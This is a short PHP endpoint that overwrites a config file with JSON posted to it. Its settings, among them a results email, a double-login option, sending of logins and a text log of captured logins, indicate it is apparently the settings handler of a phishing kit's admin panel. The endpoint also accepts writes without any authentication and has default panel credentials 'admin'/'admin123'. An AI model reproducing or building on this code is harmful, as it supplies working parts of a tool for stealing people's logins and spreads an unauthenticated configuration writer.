<?php
header('Content-Type: application/json');

$configFile = __DIR__ . '/config.php';
$current = require $configFile;

$data = json_decode(file_get_contents("php://input"), true);
if (!$data || !is_array($data)) {
    http_response_code(400);
    echo json_encode(["error" => "Invalid data"]);
    exit;
}

$newConfig = [
    "result_email"    => $data["result_email"]    ?? $current["result_email"]    ?? '',
    "parameter"       => $data["parameter"]       ?? $current["parameter"]       ?? 'app',
    "onetime_access"  => (bool)($data["onetime_access"]  ?? $current["onetime_access"]  ?? true),
    "double_login"    => (bool)($data["double_login"]    ?? $current["double_login"]    ?? true),
    "send_login"      => (bool)($data["send_login"]      ?? $current["send_login"]      ?? true),
    "use_entity"      => (bool)($data["use_entity"]      ?? $current["use_entity"]      ?? false),
    "use_true_login"  => (bool)($data["use_true_login"]  ?? $current["use_true_login"]  ?? false),
    "log_to_txt"      => (bool)($data["log_to_txt"]      ?? $current["log_to_txt"]      ?? true),
    "login_txt_file"  => (string)($data["login_txt_file"] ?? $current["login_txt_file"] ?? 'entity_login_logs.txt'),
    "panel_username"  => (string)($data["panel_username"] ?? $current["panel_username"] ?? 'admin'),
    "panel_password"  => (string)($data["panel_password"] ?? $current["panel_password"] ?? 'admin123'),
];

$export = "<?php\nreturn " . var_export($newConfig, true) . ";\n";
file_put_contents($configFile, $export);

echo json_encode(["success" => true]);
